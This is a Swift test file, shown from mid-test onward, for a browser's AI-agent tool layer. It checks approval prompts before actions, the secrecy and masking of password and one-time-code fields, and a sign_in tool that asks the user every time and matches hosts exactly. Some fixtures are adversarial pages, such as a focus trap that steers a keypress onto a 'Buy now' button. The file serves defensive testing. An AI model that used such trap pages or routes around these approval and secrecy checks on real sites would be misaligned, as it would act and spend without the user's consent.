            #expect(typed.failed && typed.text.contains("select_option"))
            for key in ["ArrowDown", "ArrowRight", "End", "Home", "ArrowUp"] {
                let pressed = await call(tab, "press_key", ["key": key, "element_id": select])
                #expect(pressed.failed && pressed.text.contains("select_option"), "\(key): \(pressed.text)")
            }
            // The list in focus without being named is the same.
            _ = await evaluate(tab, "document.getElementById('bulk').focus(); return 1")
            let focused = await call(tab, "press_key", ["key": "ArrowDown"])
            #expect(focused.failed && focused.text.contains("select_option"))
            #expect(await evaluate(tab, "return document.getElementById('bulk').value + '|' + document.title") == "Archive|Lab" || tab.title != "ran Delete account")
            #expect(await evaluate(tab, "return document.getElementById('bulk').value") == "Archive")
            #expect(!(await call(tab, "type_text", ["element_id": field, "text": "pear"])).failed, "a text field is typed into as ever")
        }

        @Test func aKeyPressedOnAnElementGoesToThatElementNotToWhateverElseHasTheFocus() async throws {
            let html = """
                <body><button id=buy onclick="document.title='bought'">Buy now</button>
                <div id=decoy onclick="document.title='decoy'" style="width:80px;height:20px">Details</div>
                <div id=trap tabindex=0 role=link onfocus="document.getElementById('buy').focus()" style="width:80px;height:20px" onclick="document.title='trap'">Trap</div>
                <div id=host><span id=inner tabindex=0 onclick="document.title='inner'">Inner</span></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let decoy = try #require(id(of: "Details", in: read)), trap = try #require(id(of: "Trap", in: read))
                // The focus is on the buy button; the decoy can't take it. Enter must not press the button.
                _ = await evaluate(tab, "document.getElementById('buy').focus(); return 1")
                let first = await call(tab, "press_key", ["key": "Enter", "element_id": decoy])
                #expect(!first.failed, "\(first.text)")
                #expect(await evaluate(tab, "return document.title") != "bought")
                #expect(guarded(stand).isEmpty)
                // A focus handler that sends the focus to the button as soon as the named element takes it.
                _ = await evaluate(tab, "document.title = 'Lab'; return 1")
                let second = await call(tab, "press_key", ["key": "Space", "element_id": trap])
                #expect(!second.failed, "\(second.text)")
                #expect(await evaluate(tab, "return document.title") != "bought")
                #expect(guarded(stand).isEmpty)
                // The element that really has the focus after its own click is still the one pressed, and judged.
                let buy = try #require(id(of: "Buy now", in: read))
                let third = await call(tab, "press_key", ["key": "Enter", "element_id": buy])
                #expect(third.failed && guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Buy now"))
                #expect(await evaluate(tab, "return document.title") != "bought")
            }
        }

        @Test func enterTypedWithSubmitIsOneSubmissionWhateverTheLegacyHandlersDo() async throws {
            let html = """
                <body>
                <form onsubmit="window.n1=(window.n1||0)+1;return false"><input placeholder="Legacy" onkeypress="if (event.which == 13) { window.legacy = (window.legacy||0)+1; return false; }"></form>
                <form onsubmit="window.n2=(window.n2||0)+1;return false"><input placeholder="Plain"></form>
                <form onsubmit="window.n3=(window.n3||0)+1;return false"><input placeholder="Own" onkeydown="if (event.key === 'Enter') { event.preventDefault(); this.form.requestSubmit() }"></form>
                <form onsubmit="window.n4=(window.n4||0)+1;return false"><input placeholder="Cancelled" onkeydown="if (event.key === 'Enter') event.preventDefault()"></form>
                <form onsubmit="window.n5=(window.n5||0)+1;return false"><input placeholder="Button"><button onclick="window.n5b=(window.n5b||0)+1">Search</button></form>
                </body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            for label in ["Legacy", "Plain", "Own", "Cancelled", "Button"] {
                let typed = await call(tab, "type_text", ["element_id": try #require(id(of: label, in: read)), "text": "x", "submit": true])
                #expect(!typed.failed, "\(label): \(typed.text)")
            }
            func count(_ name: String) async -> String { await evaluate(tab, "return String(window.\(name) ?? 0)") }
            #expect(await count("n1") == "0", "a handler that took the key in keypress sends nothing more")
            #expect(await count("legacy") == "1")
            #expect(await count("n2") == "1", "a plain field is submitted once")
            #expect(await count("n3") == "1", "a page that took the key and sent the form itself is not sent again")
            #expect(await count("n4") == "0", "a keydown that was cancelled sends nothing")
            #expect(await count("n5b") == "1", "the form's button is pressed, once")
            #expect(await count("n5") == "1")
        }

        @Test func aCallThatRanOutOfTimeWhileTheUserThoughtDoesNothing() async throws {
            var session = Session(caller: "test-deadline")
            #expect(!session.stopped)
            session.deadline = Date(timeIntervalSinceNow: -1)
            #expect(session.stopped)
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            let before = Session.lifetime
            defer { Session.lifetime = before }
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page", caller: "test-deadline").text
                let buy = try #require(id(of: "Buy now", in: read))
                // The caller gives up on a call after a while; a yes that comes later must not run it.
                Session.lifetime = 0.4
                stand.holds = true
                async let result = call(tab, "click", ["element_id": buy], caller: "test-deadline")
                #expect(await waitUntil { !guarded(stand).isEmpty })
                try await Task.sleep(for: .milliseconds(600))
                Approvals.release(.once)
                let answer = await result
                #expect(answer.failed && answer.text.contains("Stopped"), "\(answer.text)")
                #expect(await evaluate(tab, "return document.title") != "bought")
            }
        }

        @Test func everyPasswordFieldIsKnownAsOneFromTheFirstToolOnEvenIfItIsShownLater() async throws {
            let html = """
                <body style="margin:0"><button style="position:absolute;left:10px;top:10px;width:80px;height:30px" onclick="document.title='ok'">OK</button>
                <input id=pw type=password value="hunter2" style="position:absolute;left:10px;top:60px"></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            // A tool that never looked at the field itself is the first to run; later a "show" button turns the field into plain text.
            #expect(!(await call(tab, "click_at", ["x": 20, "y": 20])).failed)
            _ = await evaluate(tab, "const f = document.getElementById('pw'); f.type = 'text'; f.focus(); return 1")
            let pressed = await call(tab, "press_key", ["key": "ArrowLeft"])
            #expect(pressed.failed && pressed.text.contains("password"), "\(pressed.text)")
        }

        @Test func enterOnACheckboxSubmitsItsFormAsAnyFieldDoesAndIsJudgedAsThat() async throws {
            let html = """
                <body><form action="/x" onsubmit="document.title='sent';return false"><label><input type=checkbox id=c> Remember me</label><button>Send it</button></form>
                <label><input type=checkbox id=d onclick="window.clicked = 1"> Plain</label></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page").text
                let box = try #require(id(of: "Remember me", in: read))
                let pressed = await call(tab, "press_key", ["key": "Enter", "element_id": box])
                #expect(!pressed.failed, "\(pressed.text)")
                #expect(guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Send it"), "judged as the form's button, not as the box")
                let off = await evaluate(tab, "return document.getElementById('c').checked")
                #expect(off == "0" || off == "false", "Enter did not toggle it")
                #expect(await waitUntil { tab.title == "sent" })
                // Space toggles it, as ever.
                _ = await call(tab, "press_key", ["key": "Space", "element_id": box])
                let on = await evaluate(tab, "return document.getElementById('c').checked")
                #expect(on == "1" || on == "true")
            }
        }

        @Test func stoppingEndsAnActionThatWasApprovedAndIsAboutToRun() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let cart = try #require(id(of: "Add to cart", in: read))
            let facts = await script(tab, PageScripts.inspect, ["args": ["id": cart]])
            let json = try #require((try? JSONSerialization.jsonObject(with: Data(facts.utf8))) as? [String: Any])
            async let running = script(tab, PageScripts.click, ["args": ["id": cart, "expect": ["origin": json["origin"] ?? "", "fp": json["fp"] ?? ""]]])
            // The pause after the outline is where the stop lands.
            try await Task.sleep(for: .milliseconds(30))
            _ = await script(tab, PageScripts.clearMarks, [:])
            let answer = await running
            #expect(answer.contains("stopped") || answer == "ok", "\(answer)")
            if answer != "ok" { #expect(tab.title != "carted") }
        }

        @Test func aSliderIsMovedByItsValueAndAFieldTypedInAFrameOfTheSameSiteLands() async throws {
            let html = """
                <body><input id=r type=range min=0 max=100 step=1 value=10 style="width:200px" oninput="document.title='slid ' + this.value">
                <iframe id=fr style="width:300px;height:100px" srcdoc="<div id=ce contenteditable=true style='width:200px;height:30px'>old</div>"></iframe></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            var read = ""
            for _ in 0..<100 where !read.contains("contenteditable") && !read.contains("(in a frame)") {
                read = await call(tab, "read_page").text
                if !read.contains("(in a frame)") { try await Task.sleep(for: .milliseconds(50)) }
            }
            let slider = try #require(id(ofKind: "input[range]", in: read))
            let dragged = await call(tab, "drag", ["from_element_id": slider, "to_x": 150, "to_y": 20])
            #expect(!dragged.failed && dragged.text.contains("set the slider"), "\(dragged.text)")
            let value = Int(await evaluate(tab, "return document.getElementById('r').value")) ?? 0
            #expect(value > 60 && value < 90, "\(value)")
            let editable = try #require(read.split(separator: "\n").first { $0.contains("(in a frame)") && $0.contains("old") }.flatMap(number), "\(read)")
            let typed = await call(tab, "type_text", ["element_id": editable, "text": "new words"])
            #expect(!typed.failed)
            #expect(await evaluate(tab, "return document.getElementById('fr').contentDocument.getElementById('ce').textContent") == "new words")
        }

        @Test func waitingLooksInFramesOfOtherSitesThatNoReadNamedAndSaysWhenItCannotLook() async throws {
            let inner = "<p>Processing payment...</p>"
            let (tab, window, browser) = try await page("<body><p>Outer</p><iframe sandbox='allow-scripts' style='width:300px;height:80px' srcdoc='\(inner)'></iframe></body>", host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            // No read_page was made, so no read has named the frame.
            let there = await call(tab, "wait_for", ["text": "Processing payment", "timeout": 8])
            #expect(!there.failed && there.text.contains("is on the page"), "\(there.text)")
            let stillThere = await call(tab, "wait_for", ["text": "Processing payment", "gone": true, "timeout": 2])
            #expect(stillThere.failed && stillThere.text.contains("still on the page"), "text that shows in the frame is not gone: \(stillThere.text)")
            let never = await call(tab, "wait_for", ["text": "Order complete", "gone": true, "timeout": 2])
            #expect(!never.failed && never.text.contains("is gone"), "text that is nowhere is gone: \(never.text)")
        }

        @Test func aPasswordFieldIsOffLimitsToEveryTool() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { _ in
                let read = await call(tab, "read_page").text
                #expect(read.contains("(password field)") && !read.contains("hunter2"))
                let field = try #require(id(of: "Secret", in: read))
                #expect((await call(tab, "type_text", ["element_id": field, "text": "x"])).failed)
                #expect((await call(tab, "press_key", ["key": "Backspace", "element_id": field])).failed)
                #expect(!(await call(tab, "click", ["element_id": field])).failed, "the AI may focus it, for the user to type")
                #expect((await call(tab, "press_key", ["key": "Backspace"])).failed, "the field is in focus now")
                #expect((await call(tab, "select_option", ["element_id": field, "option": "x"])).failed)
                // Pointing at it by its place names the field but never its value.
                let place = await evaluate(tab, "const r = document.getElementById('pw').getBoundingClientRect(); return JSON.stringify([r.left + r.width / 2, r.top + r.height / 2])")
                let point = try #require((try? JSONSerialization.jsonObject(with: Data(place.utf8))) as? [Double])
                let hit = await call(tab, "click_at", ["x": point[0], "y": point[1]])
                #expect(hit.text.contains("password field") && !hit.text.contains("hunter2"))
                #expect(!(await call(tab, "read_page")).text.contains("hunter2"))
            }
        }

        @Test func aPasswordShownByAButtonStaysSecret() async throws {
            let html = """
                <body><input id=pw type=password value="hunter2" placeholder="Your key"> <button id=show onclick="document.getElementById('pw').type = 'text'">Show</button>
                <input id=code name=otp value="424242" placeholder="Code"> <input id=pin aria-label="PIN" value="9999"> <input autocomplete="one-time-code" value="777777" placeholder="Sent code">
                <input id=ok placeholder="Fruit" value="apple"> <input placeholder="Shipping" value="Pinterest"></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            var read = await call(tab, "read_page").text
            #expect(!read.contains("hunter2") && !read.contains("424242") && !read.contains("9999") && !read.contains("777777"))
            #expect(read.contains("value=\"apple\"") && read.contains("value=\"Pinterest\""), "an ordinary field's value is shown")
            let show = try #require(id(of: "Show", in: read))
            #expect(!(await call(tab, "click", ["element_id": show])).failed)
            #expect(await evaluate(tab, "return document.getElementById('pw').type") == "text")
            read = await call(tab, "read_page").text
            #expect(!read.contains("hunter2"), "still a secret after the button made it plain text")
            let pw = try #require(id(of: "Your key", in: read))
            #expect((await call(tab, "type_text", ["element_id": pw, "text": "x"])).failed)
        }

        @Test func theValueOfASecretFieldIsMaskedInThePictureAndTheFieldIsLeftAsItWas() async throws {
            let html = """
                <body><input id=pw type=password value="hunter2"> <button onclick="document.getElementById('pw').type = 'text'">Show</button>
                <input id=code name=otp value="424242" style="-webkit-text-security: none"> <input id=fruit value="apple"></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let view = try #require(tab.webView)
            func security(_ id: String) async -> String { await evaluate(tab, "return getComputedStyle(document.getElementById('\(id)')).webkitTextSecurity") }
            func both() async -> (password: String, code: String) { (await security("pw"), await security("code")) }
            _ = await call(tab, "read_page")
            _ = await evaluate(tab, "document.getElementById('pw').type = 'text'; return 1")
            var now = await both()
            #expect(now.password == "none" && now.code == "none")
            _ = await ToolCatalog.run(PageScripts.maskSecrets, [:], in: view, timeout: 5)
            now = await both()
            #expect(now.password == "disc" && now.code == "disc", "a shown password and a code are hidden")
            #expect(await security("fruit") == "none", "an ordinary field is left alone")
            _ = await ToolCatalog.run(PageScripts.unmaskSecrets, [:], in: view, timeout: 5)
            now = await both()
            #expect(now.password == "none" && now.code == "none")
            #expect(await evaluate(tab, "return document.getElementById('code').style.getPropertyValue('-webkit-text-security')") == "none", "what the page set is put back")
            // The tool does the same around its picture and leaves the page as it found it.
            let shot = await call(tab, "screenshot")
            #expect(!shot.failed)
            now = await both()
            #expect(now.password == "none" && now.code == "none")
        }

        /// The colour of a pixel of a screenshot's picture, at a point given as a share of its width and height.
        private func pixel(_ picture: String, x: Double, y: Double) -> (r: Int, g: Int, b: Int)? {
            guard let data = Data(base64Encoded: picture), let rep = NSBitmapImageRep(data: data),
                  let color = rep.colorAt(x: Int(Double(rep.pixelsWide) * x), y: Int(Double(rep.pixelsHigh) * y))?.usingColorSpace(.deviceRGB) else { return nil }
            return (Int(color.redComponent * 255), Int(color.greenComponent * 255), Int(color.blueComponent * 255))
        }

        private func isRed(_ color: (r: Int, g: Int, b: Int)?) -> Bool { color.map { $0.r > 190 && $0.g < 120 && $0.b < 120 } ?? false }

        private func picture(_ result: ToolResult) -> String? { result.content.first { $0["type"] as? String == "image" }?["data"] as? String }

        @Test func aScreenshotWithLabelsDrawsTheNumbersOnThePictureAndTouchesNothingInThePage() async throws {
            let html = """
                <body style='margin:0;background:#fff'><button style='position:absolute;left:100px;top:50px;width:120px;height:40px'>Target</button>
                <input style='position:absolute;left:300px;top:50px;width:120px;height:30px' placeholder="Fruit">
                <button style='position:absolute;left:100px;top:9000px;width:120px;height:40px'>Far</button></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let view = try #require(tab.webView)
            let width = Double(await evaluate(tab, "return innerWidth")) ?? 1, height = Double(await evaluate(tab, "return innerHeight")) ?? 900
            // The page's own scripts watch for any change to its document while the picture is made.
            _ = await evaluate(tab, "window.mutations = 0; new MutationObserver(r => { window.mutations += r.length }).observe(document, {subtree: true, childList: true, attributes: true, characterData: true}); return 1")
            let before = await evaluate(tab, "return document.documentElement.outerHTML")
            let plain = await ToolCatalog.call("screenshot", ["tab_id": tab.id], caller: "labels-plain")
            let labelled = await ToolCatalog.call("screenshot", ["tab_id": tab.id, "labels": true], caller: "labels-1")
            let note = labelled.content.compactMap { $0["text"] as? String }.joined(separator: "\n")
            #expect(!labelled.isError && note.contains("element numbers of a read_page") && note.contains("authoritative"), Comment(rawValue: note))
            try await Task.sleep(for: .milliseconds(200))
            #expect(await evaluate(tab, "return window.mutations") == "0", "nothing was added to, removed from or changed in the page")
            #expect(await evaluate(tab, "return document.documentElement.outerHTML") == before)
            // The tag of the first element's box is on the labelled picture at the element's place, and not on the plain one.
            let x = 103 / min(width, 1280), y = 53 / height
            let labelledPicture = try #require(picture(labelled)), plainPicture = try #require(picture(plain))
            #expect(isRed(pixel(labelledPicture, x: x, y: y)), "the box is where the button is")
            #expect(!isRed(pixel(plainPicture, x: x, y: y)))
            #expect(isRed(pixel(labelledPicture, x: 303 / min(width, 1280), y: 53 / height)), "and the field's")
            #expect(!isRed(pixel(labelledPicture, x: 103 / min(width, 1280), y: 400 / height)), "not where nothing is")
            // The numbers are read_page's, and only what is in view gets a box.
            let read = await call(tab, "read_page").text
            #expect(id(of: "Target", in: read) == 1 && id(of: "Fruit", in: read) == 2 && id(of: "Far", in: read) == 3)
            let rects = await ToolCatalog.run(PageScripts.rects, [:], in: view, timeout: 5)
            let list = try #require(((try? JSONSerialization.jsonObject(with: Data((rects.content.first?["text"] as? String ?? "").utf8))) as? [String: Any])?["rects"] as? [[Double]])
            #expect(list.count == 2 && list[0] == [1, 100, 50, 120, 40] && list[1] == [2, 300, 50, 120, 30], "\(list)")
            #expect((await call(tab, "screenshot", ["labels": "yes"])).failed)
        }

        @Test func aLabelledScreenshotMasksSecretsAndPutsTheBoxOfAFrameWhereItsElementIs() async throws {
            let inner = "<body style='margin:0'><button style='position:absolute;left:20px;top:30px;width:100px;height:40px'>In frame</button></body>"
            let html = "<body style='margin:0;background:#fff'><input id=code autocomplete=one-time-code value='123456' style='position:absolute;left:500px;top:300px'>"
                + "<iframe sandbox='allow-scripts' style='position:absolute;left:200px;top:200px;width:250px;height:150px;border:0' srcdoc=\"\(inner)\"></iframe></body>"
            let (tab, window, browser) = try await page(html, host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            let width = Double(await evaluate(tab, "return innerWidth")) ?? 1, height = Double(await evaluate(tab, "return innerHeight")) ?? 900
            try await asking({ _ in .once }) { _ in
                var read = ""
                for _ in 0..<100 where !read.contains("In frame") {
                    read = await call(tab, "read_page", caller: "labels-frame").text
                    if !read.contains("In frame") { try await Task.sleep(for: .milliseconds(50)) }
                }
                let labelled = await ToolCatalog.call("screenshot", ["tab_id": tab.id, "labels": true], caller: "labels-frame")
                let shot = try #require(picture(labelled), "\(labelled.content)")
                // The button sits at (200 + 20, 200 + 30) in the page: the tag of its box is there.
                #expect(isRed(pixel(shot, x: 223 / min(width, 1280), y: 233 / height)), "the frame's box is placed with the frame")
                #expect(!isRed(pixel(shot, x: 203 / min(width, 1280), y: 203 / height)), "and not at the frame's own corner")
            }
            #expect(await evaluate(tab, "return getComputedStyle(document.getElementById('code')).webkitTextSecurity") == "none", "unmasked afterwards")
        }

        @Test func aBoxIsMovedIntoTheWindowFromAFramesPixelsAndCutAtWhatShowsOfTheFrame() {
            let place = ToolCatalog.FramePlace(x: 200, y: 100, scale: 2, left: 200, top: 100, right: 500, bottom: 300)
            #expect(ToolCatalog.placed(.init(id: 3, x: 10, y: 20, width: 30, height: 40), in: place) == .init(id: 3, x: 220, y: 140, width: 60, height: 80))
            #expect(ToolCatalog.placed(.init(id: 4, x: 100, y: 50, width: 100, height: 100), in: place) == .init(id: 4, x: 400, y: 200, width: 100, height: 100), "cut at the right and bottom edge")
            #expect(ToolCatalog.placed(.init(id: 5, x: 200, y: 0, width: 10, height: 10), in: place) == nil, "outside what shows")
            let inner = ToolCatalog.nested([10, 20, 0.5, 10, 20, 400, 400], in: place)
            #expect(inner == .init(x: 220, y: 140, scale: 1, left: 220, top: 140, right: 500, bottom: 300), "\(String(describing: inner))")
            #expect(ToolCatalog.nested([1, 2, 3], in: place) == nil)
        }

        @Test func aLabelledPictureBoxesAFrameInsideAFrameAndCutsWhatTheWindowHidesOfAFrame() async throws {
            let nested = "<body style='margin:0'><button style='position:absolute;left:5px;top:5px;width:80px;height:30px'>Nested button</button></body>"
            let middle = "<body style='margin:0'><iframe sandbox='allow-scripts' style='position:absolute;left:10px;top:20px;width:200px;height:100px;border:0' srcdoc=\"\(nested.replacingOccurrences(of: "\"", with: "&quot;"))\"></iframe></body>"
            let edge = "<body style='margin:0'><button style='position:absolute;left:20px;top:10px;width:200px;height:30px'>Edge button</button><button style='position:absolute;left:250px;top:60px;width:40px;height:20px'>Hidden button</button></body>"
            let html = "<body style='margin:0;overflow:hidden'><iframe sandbox='allow-scripts' style='position:absolute;left:200px;top:200px;width:300px;height:200px;border:0' srcdoc=\"\(middle.replacingOccurrences(of: "\"", with: "&quot;"))\"></iframe>"
                + "<iframe sandbox='allow-scripts' style='position:absolute;right:-100px;top:500px;width:300px;height:100px;border:0' srcdoc=\"\(edge)\"></iframe></body>"
            let (tab, window, browser) = try await page(html, host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            let width = Double(await evaluate(tab, "return innerWidth")) ?? 1
            try await asking({ _ in .once }) { _ in
                var read = ""
                for _ in 0..<200 where !(read.contains("Nested button") && read.contains("Edge button")) {
                    read = await call(tab, "read_page", caller: "labels-nested").text
                    if !(read.contains("Nested button") && read.contains("Edge button")) { try await Task.sleep(for: .milliseconds(50)) }
                }
                let nestedID = try #require(id(of: "Nested button", in: read), Comment(rawValue: read)), edgeID = try #require(id(of: "Edge button", in: read))
                let hiddenID = id(of: "Hidden button", in: read)
                let placed = await ToolCatalog.labelBoxes(tab, tab.webView!)
                let nestedBox = try #require(placed.boxes.first { $0.id == nestedID }, "the frame inside the frame has a box: \(placed)")
                #expect(nestedBox == .init(id: nestedID, x: 215, y: 225, width: 80, height: 30), "\(nestedBox)")
                let edgeBox = try #require(placed.boxes.first { $0.id == edgeID })
                #expect(edgeBox.x == width - 200 + 20 && abs(edgeBox.x + edgeBox.width - width) < 0.5, "cut where the window ends, not drawn past it: \(edgeBox) in \(width)")
                #expect(hiddenID.map { id in !placed.boxes.contains { $0.id == id } } ?? true, "what is wholly outside the window has none")
                #expect(placed.unplaced == 0)
                let labelled = await ToolCatalog.call("screenshot", ["tab_id": tab.id, "labels": true], caller: "labels-nested")
                let note = labelled.content.compactMap { $0["text"] as? String }.last ?? ""
                #expect(!labelled.isError && note.contains("The boxes (") && note.contains("element numbers of a read_page"), Comment(rawValue: note))
            }
        }

        // MARK: sign_in

        private final class StubLogins: LoginStore {
            var items: [(host: String, username: String, password: String)]
            var passwordReads = 0
            init(_ items: [(String, String, String)]) { self.items = items.map { (host: $0.0, username: $0.1, password: $0.2) } }
            func accounts(exactly host: String) -> [String] { items.filter { $0.host == host }.map(\.username) }
            func password(exactly host: String, username: String) -> String? {
                passwordReads += 1
                return items.first { $0.host == host && $0.username == username }?.password
            }
        }

        private final class Confirmations { var reasons: [String] = []; var answer = true }

        private static let alice = "alice@example.com", secret = "S3cr3t-Passw0rd!"
        private static let loginForm = """
            <body><form id=f action="/session" onsubmit="document.title = 'submitted'; return false">
            <input id=u name=user autocomplete=username placeholder="Email"><input id=p type=password placeholder="Secret"><button>Log in</button></form>
            <script>window.log = {}; for (const id of ['u', 'p']) for (const t of ['input', 'change']) document.getElementById(id).addEventListener(t, () => { log[id + t] = (log[id + t] || 0) + 1 });</script></body>
            """

        /// Runs the body with a stand-in for the keychain and for Touch ID.
        private func signingIn(_ store: StubLogins, _ confirmations: Confirmations = Confirmations(), _ body: () async throws -> Void) async throws {
            try await SignIn.$store.withValue(store) {
                try await SignIn.$confirm.withValue({ reason in confirmations.reasons.append(reason); return confirmations.answer }) { try await body() }
            }
        }

        private func everything(_ result: ToolResult) -> String {
            String(decoding: (try? JSONSerialization.data(withJSONObject: result.json)) ?? Data(), as: UTF8.self)
        }

        @Test func signInFillsTheSavedLoginAskedEveryTimeAndNeitherItsPasswordNorItsAccountReachesTheAI() async throws {
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            try await signingIn(store, confirmations) {
                try await asking({ _ in .once }) { stand in
                    let read = await call(tab, "read_page").text
                    let result = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-signin")
                    let text = result.content.compactMap { $0["text"] as? String }.joined(separator: "\n")
                    #expect(!result.isError && text.contains("Filled the saved login for lab.test") && text.contains("the user chose the account") && text.contains("Nothing was submitted"), Comment(rawValue: text))
                    for what in [everything(result), read, (await call(tab, "read_page")).text] {
                        #expect(!what.contains(Self.secret) && !what.contains("alice") && !what.contains("example.com"), "neither the password nor the account is told")
                    }
                    let filledUser = await evaluate(tab, "return document.getElementById('u').value"), filledPassword = await evaluate(tab, "return document.getElementById('p').value")
                    #expect(filledUser == Self.alice && filledPassword == Self.secret)
                    #expect(await evaluate(tab, "return JSON.stringify(window.log)") == #"{"uinput":1,"uchange":1,"pinput":1,"pchange":1}"#, "input and change fired on both")
                    #expect(await evaluate(tab, "return document.title") != "submitted", "nothing was submitted")
                    // The user was asked, with the site and the account, and confirmed with the device owner's authentication.
                    let asked = stand.asked.filter { $0.message.contains("sign in") }
                    #expect(asked.count == 1 && asked[0].message == "Let the AI sign in to lab.test as \(Self.alice)?" && asked[0].choices == [.deny, .once])
                    #expect(confirmations.reasons.count == 1 && confirmations.reasons[0].contains("lab.test"))
                    // The fields are secrets from then on: not typed into, not shown, not told in what changed afterwards.
                    let user = try #require(id(of: "Email", in: read))
                    let typed = await call(tab, "type_text", ["element_id": user, "text": "mallory"])
                    #expect(typed.failed && typed.text.contains("password"))
                    let submit = try #require(id(of: "Log in", in: read))
                    let clicked = await call(tab, "click", ["element_id": submit])
                    #expect(!clicked.failed && !clicked.text.contains("alice") && !clicked.text.contains(Self.secret), "the click goes through the normal path: \(clicked.text)")
                    // Every time: a second use asks again.
                    _ = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-signin")
                    #expect(stand.asked.filter { $0.message.contains("sign in") }.count == 2 && confirmations.reasons.count == 2)
                }
            }
        }

        @Test func signInAsksEvenWhenTheOtherQuestionsAreOffAndAfterTheInteractionQuestionWhenOtherSitesWereRead() async throws {
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            let was = Preferences.shared.aiApprovals
            defer { Preferences.shared.aiApprovals = was }
            try await signingIn(StubLogins([("lab.test", Self.alice, Self.secret)])) {
                try await asking({ _ in .once }) { stand in
                    Preferences.shared.aiApprovals = false
                    _ = await call(tab, "sign_in", caller: "mcp-off")
                    #expect(stand.asked.count == 1 && stand.asked[0].message.contains("sign in"), "asked with the setting off")
                    Preferences.shared.aiApprovals = true
                    stand.asked.removeAll()
                    Approvals.noteRead(tab, readHost: "elsewhere.example", caller: "mcp-gate")
                    _ = await call(tab, "sign_in", caller: "mcp-gate")
                    #expect(stand.asked.count == 2 && stand.asked[0].message.contains("lab.test") && !stand.asked[0].message.contains("sign in") && stand.asked[1].message.contains("sign in"),
                            "the use of the page after reading another site is asked about too: \(stand.asked.map(\.message))")
                }
            }
        }

        @Test func signInIsRefusedWithoutAMatchForTheExactHostAndFillsNothing() async throws {
            let store = StubLogins([("other.test", "bob", "pw-other"), ("www.lab.test", "carol", "pw-www"), ("lab.test.evil.test", "dave", "pw-evil"), ("evil.test", "lab.test", "pw-name")])
            let confirmations = Confirmations()
            // A page on http, another port, and a page on a host with no saved login.
            // lab.test has a saved login, but the page is on http, or on another port.
            store.items.append((host: "lab.test", username: "alice", password: "pw-lab"))
            for (scheme, host, why) in [("https", "no-login.test", "no login for the host"), ("http", "lab.test", "http"), ("https", "lab.test:8443", "another port"),
                                        ("https", "sub.lab.test", "a subdomain")] {
                let (tab, window, browser) = try await page(Self.loginForm, host: host, scheme: scheme)
                defer { window.close(); browser.windowClosed() }
                try await signingIn(store, confirmations) {
                    try await asking({ _ in .once }) { stand in
                        let result = await call(tab, "sign_in")
                        #expect(result.failed, Comment(rawValue: "\(why): \(result.text)"))
                        if why == "no login for the host" || why == "a subdomain" {
                            #expect(result.text == ToolCatalog.signInNotDone.content.compactMap { $0["text"] as? String }.joined(), "no saved login has the one answer")
                        }
                        if why == "no login for the host" || why == "a subdomain" {
                            // The user is asked as if there were one, with nothing to allow, and nothing is confirmed or read.
                            #expect(stand.asked.count == 1 && stand.asked[0].choices == [.deny] && stand.asked[0].accounts.isEmpty && stand.asked[0].detail.contains("no saved login"), "\(stand.asked.map(\.message))")
                            #expect(confirmations.reasons.isEmpty && store.passwordReads == 0)
                        } else {
                            #expect(stand.asked.isEmpty && confirmations.reasons.isEmpty && store.passwordReads == 0, "nothing was asked, confirmed or read")
                        }
                        #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "")
                        for name in ["pw-other", "pw-www", "pw-evil", "pw-lab", "bob", "carol", "dave"] { #expect(!result.text.contains(name)) }
                    }
                }
            }
        }

        @Test func signInIsRefusedInAPrivateWindow() async throws {
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            let browser = Browser(isPrivate: true)
            browser.focused()
            defer { browser.windowClosed() }
            let tab = browser.openTab(url: nil)
            let view = tab.wake()
            let window = OffscreenWindow(view)
            defer { window.close() }
            view.loadHTMLString(Self.loginForm, baseURL: URL(string: "https://lab.test/"))
            #expect(await waitUntil { !view.isLoading && view.url != nil })
            try await signingIn(store, confirmations) {
                try await asking({ _ in .once }) { stand in
                    let direct = await ToolCatalog.signIn([:], tab: tab, webView: view, session: Session(caller: "mcp-private"))
                    #expect(direct.isError && direct.content.compactMap { $0["text"] as? String }.joined().contains("private"))
                    let viaTool = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-private")
                    #expect(viaTool.isError, "a private window's tabs are not the AI's at all")
                    #expect(stand.asked.isEmpty && confirmations.reasons.isEmpty && store.passwordReads == 0)
                    #expect(await evaluate(tab, "return document.getElementById('p').value") == "")
                }
            }
        }

        @Test func signInDoesNothingIfTheUserDeclinesOrDoesNotConfirmAndTheAIIsToldTheSameAsWhenNoLoginIsSaved() async throws {
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
